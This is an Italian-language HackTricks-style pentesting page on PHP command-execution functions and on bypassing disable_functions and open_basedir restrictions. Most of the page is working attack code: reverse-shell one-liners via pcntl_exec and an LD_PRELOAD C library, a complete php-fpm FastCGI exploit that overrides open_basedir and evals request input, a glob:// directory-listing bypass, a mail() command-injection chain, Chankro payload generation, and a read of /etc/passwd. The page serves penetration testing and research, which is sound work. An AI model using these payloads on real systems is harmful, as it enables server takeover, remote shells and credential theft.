# PHP - Funzioni Utili e bypass di disable_functions/open_basedir

{{#include ../../../../banners/hacktricks-training.md}}

## Esecuzione di Comandi e Codice PHP

### Esecuzione di Comandi PHP

**Nota:** Un [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell può **automaticamente** controllare e bypassare la seguente funzione se alcune di esse sono disabilitate.

**exec** - Restituisce l'ultima riga dell'output dei comandi
```bash
echo exec("uname  -a");
```
**passthru** - Passa l'output dei comandi direttamente al browser
```bash
echo passthru("uname -a");
```
**system** - Passa l'output dei comandi direttamente al browser e restituisce l'ultima riga
```bash
echo system("uname -a");
```
**shell_exec** - Restituisce l'output dei comandi
```bash
echo shell_exec("uname -a");
```
\`\` (backticks) - Stesso di shell_exec()
```bash
echo `uname -a`
```
**popen** - Apre un pipe di lettura o scrittura a un processo di un comando
```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```
**proc_open** - Simile a popen() ma con un maggiore controllo
```bash
proc_close(proc_open("uname -a",array(),$something));
```
**preg_replace**
```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```
**pcntl_exec** - Esegue un programma (per impostazione predefinita, in PHP moderni e non così moderni, è necessario caricare il modulo `pcntl.so` per utilizzare questa funzione)
```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```
**mail / mb_send_mail** - Questa funzione viene utilizzata per inviare email, ma può anche essere abusata per iniettare comandi arbitrari all'interno del parametro `$options`. Questo perché la **funzione `mail` di php** di solito chiama il binario `sendmail` all'interno del sistema e consente di **aggiungere opzioni extra**. Tuttavia, non sarai in grado di vedere l'output del comando eseguito, quindi è consigliato creare uno script shell che scrive l'output in un file, eseguirlo utilizzando mail e stampare l'output:
```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```
**dl** - Questa funzione può essere utilizzata per caricare dinamicamente un'estensione PHP. Questa funzione non sarà sempre presente, quindi dovresti controllare se è disponibile prima di provare a sfruttarla. Leggi [questa pagina per imparare a sfruttare questa funzione](disable_functions-bypass-dl-function.md).

### Esecuzione di Codice PHP

Oltre a eval, ci sono altri modi per eseguire codice PHP: include/require possono essere utilizzati per l'esecuzione di codice remoto sotto forma di vulnerabilità Local File Include e Remote File Include.
```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```
## disable_functions & open_basedir

**Le funzioni disabilitate** è l'impostazione che può essere configurata nei file `.ini` in PHP che **vietano** l'uso delle **funzioni** indicate. **Open basedir** è l'impostazione che indica a PHP la cartella a cui può accedere.\
L'impostazione PHP deve essere configurata nel percorso _/etc/php7/conf.d_ o simile.

Entrambe le configurazioni possono essere viste nell'output di **`phpinfo()`**:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../images/image (493).png>)

## open_basedir Bypass

`open_basedir` configurerà le cartelle a cui PHP può accedere, **non sarai in grado di scrivere/leggere/eseguire alcun file al di fuori** di quelle cartelle, ma **non sarai nemmeno in grado di elencare** altre directory.\
Tuttavia, se in qualche modo riesci a eseguire codice PHP arbitrario, puoi **provare** il seguente blocco di **codice** per cercare di **bypassare** la restrizione.

### Elencare le directory con il bypass glob://

In questo primo esempio viene utilizzato il protocollo `glob://` con un bypass di percorso:
```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```
**Nota1**: Nel percorso puoi anche usare `/e??/*` per elencare `/etc/*` e qualsiasi altra cartella.\
**Nota2**: Sembra che parte del codice sia duplicata, ma in realtà è necessario!\
**Nota3**: Questo esempio è utile solo per elencare le cartelle, non per leggere i file.

### Bypass completo di open_basedir abusando di FastCGI

Se vuoi **saperne di più su PHP-FPM e FastCGI** puoi leggere la [prima sezione di questa pagina](disable_functions-bypass-php-fpm-fastcgi.md).\
Se **`php-fpm`** è configurato, puoi abusarne per bypassare completamente **open_basedir**:

![](<../../../../images/image (545).png>)

![](<../../../../images/image (577).png>)

Nota che la prima cosa che devi fare è trovare dove si trova il **socket unix di php-fpm**. Di solito si trova sotto `/var/run`, quindi puoi **usare il codice precedente per elencare la directory e trovarlo**.\
Codice da [qui](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy).
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```
Questi script comunicheranno con **unix socket di php-fpm** (di solito situato in /var/run se viene utilizzato fpm) per eseguire codice arbitrario. Le impostazioni di `open_basedir` verranno sovrascritte dall'attributo **PHP_VALUE** che viene inviato.\
Nota come `eval` viene utilizzato per eseguire il codice PHP che invii all'interno del parametro **cmd**.\
Nota anche la **linea commentata 324**, puoi decommentarla e il **payload si connetterà automaticamente all'URL fornito ed eseguirà il codice PHP** contenuto lì.\
Basta accedere a `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` per ottenere il contenuto del file `/etc/passwd`.

> [!WARNING]
> Potresti pensare che proprio come abbiamo sovrascritto la configurazione di `open_basedir`, possiamo **sovrascrivere `disable_functions`**. Bene, prova, ma non funzionerà, apparentemente **`disable_functions` può essere configurato solo in un file di configurazione `.ini` php** e le modifiche che esegui utilizzando PHP_VALUE non saranno efficaci su questa impostazione specifica.

## Bypass di disable_functions

Se riesci a far eseguire codice PHP all'interno di una macchina, probabilmente vorrai passare al livello successivo e **eseguire comandi di sistema arbitrari**. In questa situazione è comune scoprire che la maggior parte o tutte le **funzioni** PHP che consentono di **eseguire comandi di sistema sono state disabilitate** in **`disable_functions`.**\
Quindi, vediamo come puoi bypassare questa restrizione (se puoi)

### Scoperta automatica del bypass

Puoi utilizzare lo strumento [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) e ti indicherà quale funzione (se presente) puoi utilizzare per **bypassare** **`disable_functions`**.

### Bypass utilizzando altre funzioni di sistema

Torna all'inizio di questa pagina e **controlla se una delle funzioni di esecuzione dei comandi non è disabilitata e disponibile nell'ambiente**. Se ne trovi solo 1, sarai in grado di usarla per eseguire comandi di sistema arbitrari.

### Bypass LD_PRELOAD

È ben noto che alcune funzioni in PHP come `mail()` andranno a **eseguire binari all'interno del sistema**. Pertanto, puoi abusarne utilizzando la variabile di ambiente `LD_PRELOAD` per farle caricare una libreria arbitraria che può eseguire qualsiasi cosa.

#### Funzioni che possono essere utilizzate per bypassare disable_functions con LD_PRELOAD

- **`mail`**
- **`mb_send_mail`**: Efficace quando il modulo `php-mbstring` è installato.
- **`imap_mail`**: Funziona se il modulo `php-imap` è presente.
- **`libvirt_connect`**: Richiede il modulo `php-libvirt-php`.
- **`gnupg_init`**: Utilizzabile con il modulo `php-gnupg` installato.
- **`new imagick()`**: Questa classe può essere abusata per bypassare le restrizioni. Tecniche di sfruttamento dettagliate possono essere trovate in un [**writeup qui**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Puoi [**trovare qui**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) lo script di fuzzing che è stato utilizzato per trovare queste funzioni.

Ecco una libreria che puoi compilare per abusare della variabile di ambiente `LD_PRELOAD`:
```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```
#### Bypass usando Chankro

Per abusare di questa misconfigurazione puoi [**Chankro**](https://github.com/TarlogicSecurity/Chankro). Questo è uno strumento che **genera un exploit PHP** che devi caricare sul server vulnerabile ed eseguirlo (accedendovi tramite web).\
**Chankro** scriverà all'interno del disco delle vittime la **libreria e la reverse shell** che desideri eseguire e utilizzerà il\*\*`LD_PRELOAD` trick + la funzione PHP `mail()`\*\* per eseguire la reverse shell.

Nota che per utilizzare **Chankro**, `mail` e `putenv` **non possono apparire all'interno della lista `disable_functions`**.\
Nell'esempio seguente puoi vedere come **creare un exploit chankro** per **arch 64**, che eseguirà `whoami` e salverà l'output in _/tmp/chankro_shell.out_, chankro **scriverà la libreria e il payload** in _/tmp_ e il **final exploit** si chiamerà **bicho.php** (questo è il file che devi caricare sul server delle vittime):

{{#tabs}}
{{#tab name="shell.sh"}}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{{#endtab}}

{{#tab name="Chankro"}}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{{#endtab}}
{{#endtabs}}

Se scopri che la funzione **mail** è bloccata da funzioni disabilitate, potresti comunque essere in grado di utilizzare la funzione **mb_send_mail.**\
Maggiore informazione su questa tecnica e Chankro qui: [https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/)

### "Bypass" utilizzando le capacità di PHP

Nota che utilizzando **PHP** puoi **leggere e scrivere file, creare directory e cambiare permessi**.\
Puoi persino **dumpare database**.\
Forse utilizzando **PHP** per **enumerare** la macchina puoi trovare un modo per elevare i privilegi/eseguire comandi (ad esempio leggendo alcune chiavi ssh private).

Ho creato una webshell che rende molto facile eseguire queste azioni (nota che la maggior parte delle webshell ti offrirà anche queste opzioni): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Bypass dipendenti da moduli/versioni

Ci sono diversi modi per bypassare disable_functions se viene utilizzato un modulo specifico o sfruttare una versione specifica di PHP:

- [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable_functions-bypass-php-fpm-fastcgi.md)
- [**Bypass con FFI - Interfaccia Funzione Esterna abilitata**](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/broken-reference/README.md)
- [**Bypass tramite mem**](disable_functions-bypass-via-mem.md)
- [**mod_cgi**](disable_functions-bypass-mod_cgi.md)
- [**Estensione PHP Perl Safe_mode**](disable_functions-bypass-php-perl-extension-safe_mode-bypass-exploit.md)
- [**funzione dl**](disable_functions-bypass-dl-function.md)
- [**Questo exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
- 5.\* - sfruttabile con piccole modifiche al PoC
- 7.0 - tutte le versioni fino ad oggi
- 7.1 - tutte le versioni fino ad oggi
- 7.2 - tutte le versioni fino ad oggi
- 7.3 - tutte le versioni fino ad oggi
- 7.4 - tutte le versioni fino ad oggi
- 8.0 - tutte le versioni fino ad oggi
- [**Da 7.0 a 8.0 exploit (solo Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
- [**PHP 7.0=7.4 (\*nix)**](disable_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
- [**Imagick 3.3.0 PHP >= 5.4**](disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
- [**PHP 5.x Shellsock**](disable_functions-php-5.x-shellshock-exploit.md)
- [**PHP 5.2.4 ionCube**](disable_functions-php-5.2.4-ioncube-extension-exploit.md)
- [**PHP <= 5.2.9 Windows**](disable_functions-bypass-php-less-than-5.2.9-on-windows.md)
- [**PHP 5.2.4/5.2.5 cURL**](disable_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
- [**PHP 5.2.3 -Win32std**](disable_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
- [**PHP 5.2 FOpen exploit**](disable_functions-bypass-php-5.2-fopen-exploit.md)
- [**PHP 4 >= 4.2.-, PHP 5 pcntl_exec**](disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.md)

### **Strumento Automatico**

Lo script seguente prova alcuni dei metodi commentati qui:\
[https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php)

## Altre funzioni PHP interessanti

### Elenco di funzioni che accettano callback

Queste funzioni accettano un parametro stringa che potrebbe essere utilizzato per chiamare una funzione a scelta dell'attaccante. A seconda della funzione, l'attaccante potrebbe o meno avere la possibilità di passare un parametro. In tal caso, una funzione di divulgazione delle informazioni come phpinfo() potrebbe essere utilizzata.

[Callbacks / Callables](https://www.php.net/manual/en/language.types.callable.php)

[Elenco seguente da qui](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```
### Informazioni sulla divulgazione

La maggior parte di queste chiamate di funzione non sono sink. Ma potrebbe essere una vulnerabilità se uno qualsiasi dei dati restituiti è visibile a un attaccante. Se un attaccante può vedere phpinfo(), è sicuramente una vulnerabilità.
```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```
### Altro
```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```
### Funzioni del File System

Secondo RATS, tutte le funzioni del file system in php sono pericolose. Alcune di queste non sembrano molto utili per l'attaccante. Altre sono più utili di quanto si possa pensare. Ad esempio, se allow_url_fopen=On, allora un URL può essere utilizzato come percorso di file, quindi una chiamata a copy($\_GET\['s'], $\_GET\['d']); può essere utilizzata per caricare uno script PHP ovunque nel sistema. Inoltre, se un sito è vulnerabile a una richiesta inviata tramite GET, ognuna di quelle funzioni del file system può essere abusata per canalizzare un attacco verso un altro host attraverso il tuo server.

**Gestore del file system aperto**
```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```
**Scrivere nel filesystem (parzialmente in combinazione con la lettura)**
```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```
**Leggi dal filesystem**
```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```
{{#include ../../../../banners/hacktricks-training.md}}
